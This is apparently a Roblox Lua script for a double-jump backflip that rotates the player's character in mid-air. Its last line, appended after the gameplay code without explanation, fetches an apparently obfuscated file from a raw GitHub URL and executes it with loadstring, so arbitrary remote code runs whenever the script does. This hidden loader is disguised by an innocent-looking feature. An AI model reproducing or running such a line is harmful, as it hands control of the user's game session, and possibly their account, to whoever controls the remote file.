local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")

local hasDoubleJumped = false
local backflipDuration = 0.5 -- seconds
local jumpBoostPower = 30 -- Just a little boost

local function performBackflip()
    -- Apply a *small* upward force only ONCE at the start
    rootPart.Velocity = Vector3.new(rootPart.Velocity.X, jumpBoostPower, rootPart.Velocity.Z)
    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)

    -- Rotate in place
    local startTime = tick()
    local initialRotation = rootPart.CFrame - rootPart.CFrame.Position

    local connection
    connection = RunService.RenderStepped:Connect(function()
        local elapsed = tick() - startTime
        if elapsed < backflipDuration then
            local progress = elapsed / backflipDuration
            local rotation = CFrame.Angles(math.rad(-360 * progress), 0, 0)
            rootPart.CFrame = CFrame.new(rootPart.Position) * initialRotation * rotation
        else
            connection:Disconnect()
            -- Finish cleanly: face forward again
            rootPart.CFrame = CFrame.new(rootPart.Position) * initialRotation
        end
    end)
end

-- Reset when you land
humanoid.StateChanged:Connect(function(_, newState)
    if newState == Enum.HumanoidStateType.Landed then
        hasDoubleJumped = false
    end
end)

UserInputService.JumpRequest:Connect(function()
    if humanoid.FloorMaterial ~= Enum.Material.Air then
        -- Normal ground jump
    elseif not hasDoubleJumped then
        -- In air, do backflip
        hasDoubleJumped = true
        performBackflip()
    end
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Nwepnet/stuffido/refs/heads/main/Protected_6709835173603518.txt",true))()
